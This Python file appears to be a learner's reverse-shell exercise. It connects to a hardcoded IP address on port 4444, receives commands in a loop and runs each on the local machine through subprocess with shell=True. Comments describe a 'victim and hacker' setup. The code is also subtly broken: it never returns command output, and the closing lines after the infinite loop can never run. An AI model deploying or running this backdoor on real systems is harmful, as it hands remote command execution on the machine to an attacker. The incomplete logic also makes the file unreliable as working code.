import socket
import os
import pathlib
import subprocess

#subprocess allows you to execute system commands/other programs from python
#subprocess.call('ipconfig',shell=True)

#subprocess - some of them will run in the backgorund , foreground
#some of them will finish executing then only other will execute - call - foreground
# https://stackoverflow.com/questions/7681715/whats-the-difference-between-subprocess-popen-and-call-how-can-i-use-them#:~:text=Popen%20is%20more%20general%20than,Popen%20returns%20a%20Popen%20object.


def command_execute_result(command):
    return subprocess.check_output(command,shell=True)


connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connection.connect(("10.207.48.142",4444))
print("hi am here")
# connection.send(b"connecting estalished")
while True:

    command = connection.recv(1024)
    command = command.decode()
    command_result = command_execute_result(command)

print(command_result.decode())
connection.close()


#adding our own listener btn victim and hacker - check next file
